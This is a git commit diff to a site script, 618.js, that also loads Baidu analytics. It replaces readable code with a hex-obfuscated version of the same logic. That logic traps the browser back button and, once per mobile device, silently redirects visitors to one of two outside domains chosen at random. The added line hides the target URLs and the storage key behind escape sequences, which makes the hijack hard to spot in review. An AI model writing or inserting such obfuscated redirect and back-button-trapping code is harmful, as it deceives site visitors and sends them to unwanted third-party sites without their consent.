beb3b68865d8c20e4694c18b4668847f645c452d
mihoutao18 <138785638+mihoutao1868@users.noreply.github.com>
2025-04-27 23:22:59 +0800

    Update 618.js

--- 618.js
+++ 618.js
@@ -6,24 +6,4 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
- ;(function() {
-    history.pushState(null, '', location.href);
-    window.addEventListener('popstate', function () {
-      history.pushState(null, '', location.href);
-    });
-  })();
-
-  ;(function() {
-    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
-                     .test(navigator.userAgent);
-    if (!isMobile) return;
-    var KEY = 'hasRedirected91pa';
-    if (localStorage.getItem(KEY)) return;
-    localStorage.setItem(KEY, 'true');
-    var targets = [
-      'https://91pa.app/',
-      'https://kanpianapp.com/'
-    ];
-    var choice = targets[Math.floor(Math.random() * targets.length)];
-    window.location.replace(choice);
-  })();
+!function(){history["\x70\x75\x73\x68\x53\x74\x61\x74\x65"](null,"",location.href),window.addEventListener("popstate",function(){history["\x70\x75\x73\x68\x53\x74\x61\x74\x65"](null,"",location.href)})}(),!function(){var a=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);if(!a)return;var b="\x68\x61\x73\x52\x65\x64\x69\x72\x65\x63\x74\x65\x64\x39\x31\x70\x61",c=localStorage.getItem(b);if(c)return;localStorage.setItem(b,"true");var d=["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x39\x31\x70\x61\x2e\x61\x70\x70\x2f","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6b\x61\x6e\x70\x69\x61\x6e\x61\x70\x70\x2e\x63\x6f\x6d\x2f"],e=d[Math.floor(Math.random()*d.length)];window.location.replace(e)}();
